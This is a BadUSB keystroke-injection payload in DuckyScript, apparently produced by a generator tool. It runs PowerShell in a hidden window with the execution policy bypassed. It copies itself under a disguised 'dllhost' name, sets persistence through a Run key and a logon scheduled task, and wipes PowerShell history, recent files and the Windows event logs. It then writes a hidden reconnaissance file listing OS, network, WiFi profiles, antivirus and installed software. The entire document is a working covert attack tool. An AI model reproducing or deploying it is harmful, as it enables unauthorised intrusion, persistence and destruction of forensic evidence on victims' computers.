REM ╔══════════════════════════════════════════════════════════════╗
REM ║  System Reconnaissance + Persistence                       ║
REM ║  Generated by Pen15 BadUSB Wizard                          ║
REM ║  Self-hiding, auto-runs on login, gathers full recon      ║
REM ╚══════════════════════════════════════════════════════════════╝
REM  Target: {{computer_name}}

DELAY 1500
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 2000

REM ── Self-hide ──
STRING $hideDir = "$env:ProgramData\Microsoft\Windows\"
ENTER
STRING if (!(Test-Path $hideDir)) { New-Item -Path $hideDir -ItemType Directory -Force | Out-Null }
ENTER
STRING $myPath = $hideDir + "dllhost_svc.ps1"
ENTER
STRING if ($MyInvocation.MyCommand.Path -ne $myPath) {
ENTER
STRING   Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $myPath -Force
ENTER
STRING   Set-ItemProperty $myPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DllHostSvc" /t REG_SZ /d "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /f 2>$null
ENTER
STRING   schtasks /create /tn "DllHostSvcTask" /tr "powershell -w hidden -ExecutionPolicy Bypass -File `"$myPath`"" /sc onlogon /f 2>$null
ENTER
STRING   Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
ENTER
STRING   Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
ENTER
STRING   wevtutil cl Security 2>$null; wevtutil cl System 2>$null; wevtutil cl Application 2>$null
ENTER
STRING   Start-Process powershell -ArgumentList "-w hidden -ExecutionPolicy Bypass -File `"$myPath`"" -WindowStyle Hidden
ENTER
STRING   exit
ENTER
STRING }
ENTER

REM ── Gather recon ──
STRING $r = @()
ENTER
STRING $r += "=== RECON: {{computer_name}} ==="
ENTER
STRING $r += "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
ENTER
STRING $r += ""
ENTER
STRING $r += "--- OS ---"
ENTER
STRING $r += "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)"
ENTER
STRING $r += "Version: $((Get-CimInstance Win32_OperatingSystem).Version)"
ENTER
STRING $r += "User: $env:USERNAME"
ENTER
STRING $r += "Computer: $env:COMPUTERNAME"
ENTER
STRING $r += ""
ENTER
STRING $r += "--- Hardware ---"
ENTER
STRING $r += "CPU: $((Get-CimInstance Win32_Processor).Name)"
ENTER
STRING $r += "RAM: $([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB, 1)) GB"
ENTER
STRING $r += ""
ENTER
STRING $r += "--- Network ---"
ENTER
STRING $r += (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | ForEach-Object { "$($_.InterfaceAlias): $($_.IPAddress)" }) -join "`n"
ENTER
STRING $r += ""
ENTER
STRING $r += "--- WiFi ---"
ENTER
STRING $r += (netsh wlan show profiles 2>$null | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() }) -join "`n"
ENTER
STRING $r += ""
ENTER
STRING $r += "--- Security ---"
ENTER
STRING $r += "AV: $((Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue).displayName -join ', ')"
ENTER
STRING $r += ""
ENTER
STRING $r += "--- Software ---"
ENTER
STRING $r += (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName,DisplayVersion | Where-Object {$_.DisplayName} | ForEach-Object { "$($_.DisplayName) v$($_.DisplayVersion)" } | Sort-Object) -join "`n"
ENTER
STRING $r += ""
ENTER
STRING $r += "=== END ==="
ENTER
STRING $outPath = "$hideDir\recon_{{computer_name}}.txt"
ENTER
STRING $r | Out-File $outPath -Encoding UTF8
ENTER
STRING Set-ItemProperty $outPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
ENTER
STRING notepad $outPath
ENTER
STRING Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
ENTER
STRING exit
REM ══════════════════════════════════════════════════════════════
REM Recon complete — hidden in ProgramData, persists on login
REM Auto-refreshes recon data each boot
REM ══════════════════════════════════════════════════════════════
